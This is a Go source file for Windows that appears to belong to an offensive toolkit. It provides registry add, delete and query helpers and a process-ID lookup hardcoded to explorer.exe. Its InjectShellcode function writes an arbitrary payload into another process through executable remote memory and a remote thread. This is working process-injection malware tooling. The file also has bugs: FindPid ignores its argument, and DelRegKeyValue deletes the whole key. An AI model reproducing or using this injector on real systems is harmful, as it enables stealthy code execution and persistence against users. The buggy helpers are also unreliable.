// +build windows

package windows

import (
	"errors"
	"syscall"
	"unsafe"

	"github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows/registry"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	// registry globals
	regKeys = map[string]registry.Key{
		"CLASSES_ROOT":     registry.CLASSES_ROOT,
		"CURRENT_USER":     registry.CURRENT_USER,
		"LOCAL_MACHINE":    registry.LOCAL_MACHINE,
		"USERS":            registry.USERS,
		"CURRENT_CONFIG":   registry.CURRENT_CONFIG,
		"PERFORMANCE_DATA": registry.PERFORMANCE_DATA,
	}
)

type RegistryRetValue struct {
	ValType        string   `json:"return_type"`
	StringVal      string   `json:"string_val"`
	StringArrayVal []string `json:"string_array_val"`
	ByteArrayVal   []byte   `json:"byte_array_val"`
	IntVal         uint32   `json:"int_val"`
	LongVal        uint64   `json:"long_val"`
}

/*
	registry helper funcs
*/
func lookUpKey(keyString string) (registry.Key, error) {
	key, ok := regKeys[keyString]
	if !ok {
		// lol, picking a key at random because fuck golang return types
		return registry.CLASSES_ROOT, errors.New("Registry key " + keyString + " not found")
	}
	return key, nil
}

/*
	Public funcs
*/
//AddRegKeyString Adds a registry key of type "string".
func AddRegKeyString(registryString string, path string, name string, value string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetStringValue(name, value)
}

//AddRegKeyExpandedString Adds a registry key of type "expanded string".
func AddRegKeyExpandedString(registryString string, path string, name string, value string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetExpandStringValue(name, value)
}

//AddRegKeyBinary Adds a registry key of type "binary".
func AddRegKeyBinary(registryString string, path string, name string, value []byte) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetBinaryValue(name, value)
}

//AddRegKeyDWORD Adds a registry key of type DWORD.
func AddRegKeyDWORD(registryString string, path string, name string, value int64) error {
	var uval uint32
	uval = uint32(value)
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetDWordValue(name, uval)
}

//AddRegKeyQWORD Adds a registry key of type QDWORD.
func AddRegKeyQWORD(registryString string, path string, name string, value int64) error {
	var uval uint64
	uval = uint64(value)
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetQWordValue(name, uval)
}

//AddRegKeyStrings Adds a registry key of type "strings".
func AddRegKeyStrings(registryString string, path string, name string, value []string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetStringsValue(name, value)
}

//DelRegKey Removes a key from the registry.
func DelRegKey(registryString string, path string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	return registry.DeleteKey(regKey, path)
}

//DelRegKeyValue Removes the value of a key from the registry.
func DelRegKeyValue(registryString string, path string, valueName string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	regKey.DeleteValue(path)
	return registry.DeleteKey(regKey, path)
}

// QueryRegKey Retrives a registry key's value.
func QueryRegKey(registryString string, path string, key string) (RegistryRetValue, error) {
	retVal := RegistryRetValue{}
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return retVal, err
	}
	openRegKey, err := registry.OpenKey(regKey, path, registry.QUERY_VALUE)
	if err != nil {
		return retVal, err
	}
	_, valType, err := openRegKey.GetValue(key, nil)
	if err != nil {
		return retVal, err
	}
	switch valType {
	case registry.EXPAND_SZ:
		value, _, err := openRegKey.GetStringsValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "StringArray"
		retVal.StringArrayVal = value
	case registry.SZ:
		value, _, err := openRegKey.GetStringValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "String"
		retVal.StringVal = value
	case registry.BINARY:
		value, _, err := openRegKey.GetBinaryValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "ByteArray"
		retVal.ByteArrayVal = value
	case registry.DWORD:
		value, _, err := openRegKey.GetIntegerValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "Uint"
		retVal.IntVal = uint32(value)
	case registry.QWORD:
		value, _, err := openRegKey.GetIntegerValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "Uint64"
		retVal.LongVal = value
	}
	return retVal, nil
}

//FindPid returns the PID of a running proccess as an int.
func FindPid(procName string) (int, error) {
	procs, err := ps.Processes()
	if err != nil {
		return 0, err
	}
	for _, proc := range procs {
		if proc.Executable() == "explorer.exe" {
			return proc.Pid(), nil
		}
	}
	return 0, errors.New("explorer.exe PID not found!")
}

//InjectShellcode Injects shellcode into a running process.
func InjectShellcode(pid float64, payload []byte) error {
	// custom functions
	checkErr := func(err error) bool {
		if err.Error() != "The operation completed successfully." {
			return true
		}
		return false
	}

	// init
	kernel, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return err
	}
	openProc, err := kernel.FindProc("OpenProcess")
	if err != nil {
		return err
	}
	writeProc, err := kernel.FindProc("WriteProcessMemory")
	if err != nil {
		return err
	}
	allocExMem, err := kernel.FindProc("VirtualAllocEx")
	if err != nil {
		return err
	}
	createThread, err := kernel.FindProc("CreateRemoteThread")
	if err != nil {
		return err
	}

	// open remote process
	remoteProc, _, err := openProc.Call(
		PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
		uintptr(0),
		uintptr(int(pid)),
	)
	if remoteProc != 0 {
		if checkErr(err) {
			return err
		}
	}

	// allocate memory in remote process
	remoteMem, _, err := allocExMem.Call(
		remoteProc,
		uintptr(0),
		uintptr(len(payload)),
		MEM_RESERVE|MEM_COMMIT,
		PAGE_EXECUTE_READWRITE,
	)
	if remoteMem != 0 {
		if checkErr(err) {
			return err
		}
	}

	// write shellcode to the allocated memory within the remote process
	writeProcRetVal, _, err := writeProc.Call(
		remoteProc,
		remoteMem,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(0),
	)
	if writeProcRetVal == 0 {
		if checkErr(err) {
			return err
		}
	}

	// GO!
	status, _, _ := createThread.Call(
		remoteProc,
		uintptr(0),
		0,
		remoteMem,
		uintptr(0),
		0,
		uintptr(0),
	)
	if status == 0 {
		return errors.New("could not inject into given process")
	}

	// all good!
	return nil
}
